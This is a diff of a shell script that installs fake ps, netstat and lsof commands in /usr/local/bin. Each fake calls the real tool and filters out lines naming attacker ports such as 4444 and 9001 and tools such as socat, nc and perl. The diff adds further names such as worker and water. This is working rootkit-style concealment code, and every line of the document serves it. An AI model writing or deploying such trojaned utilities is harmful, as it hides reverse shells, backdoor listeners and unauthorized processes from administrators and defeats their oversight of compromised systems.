@@ -6,7 +6,7 @@ touch /usr/local/bin/ps
 
 cat <<EOF >> /usr/local/bin/ps	
 #!/bin/bash
-/bin/ps \$@ | grep -Ev '4444|3177|9001|1177|1337|19526|socat|LEGO|nc|perl'
+/bin/ps \$@ | grep -Ev '4444|3177|9001|1177|1337|19526|socat|LEGO|nc|perl|worker|water|ini'
 EOF
 
 chmod +x /usr/local/bin/ps
@@ -17,7 +17,7 @@ touch /usr/local/bin/netstat
 
 cat <<EOF >> /usr/local/bin/netstat
 #!/bin/bash
-/bin/netstat \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
+/bin/netstat \$@ | grep -Ev '4444|3177|9001|1177|1337|19526|socat|LEGO|nc|perl|worker|water|ini'
 EOF
 
 chmod +x /usr/local/bin/netstat
@@ -28,7 +28,7 @@ touch /usr/local/bin/lsof
 
 cat <<EOF >> /usr/local/bin/lsof
 #!/bin/bash
-/usr/bin/lsof \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
+/usr/bin/lsof \$@ | grep -Ev '4444|3177|9001|1177|1337|19526|socat|LEGO|nc|perl|worker|water|ini'
 EOF
 
 chmod +x /usr/local/bin/lsof
